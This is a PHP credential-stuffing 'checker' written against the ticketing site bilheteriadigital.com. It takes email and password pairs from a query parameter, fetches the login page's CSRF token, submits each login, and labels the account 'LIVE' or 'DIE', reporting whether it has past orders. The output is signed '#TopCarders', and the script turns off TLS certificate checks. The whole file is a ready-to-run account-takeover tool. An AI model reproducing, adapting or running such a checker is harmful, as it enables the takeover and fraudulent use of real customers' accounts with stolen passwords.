
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$nc = new cURL();
$getoken = $nc->get('https://www.bilheteriadigital.com/login');
$token = getStr($getoken,'<meta name="csrf-token" content="','">');


$a = new cURL();
        $b = $a->post('https://www.bilheteriadigital.com/login', '_csrf='.$token.'&LoginForm%5Bemail%5D='.$email.'&LoginForm%5Bsenha%5D='.$senha.'&acao=login');
        

if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }

        
        if (strpos($b, 'Você ainda nâo realizou nenhum pedido.')) { $pedidos = "Não"; }else{ $pedidos = "Sim"; }
               


        if (strpos($b, 'Minha Conta')) { 

 echo "LIVE → $email|$senha | Pedidos: $pedidos #TopCarders";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
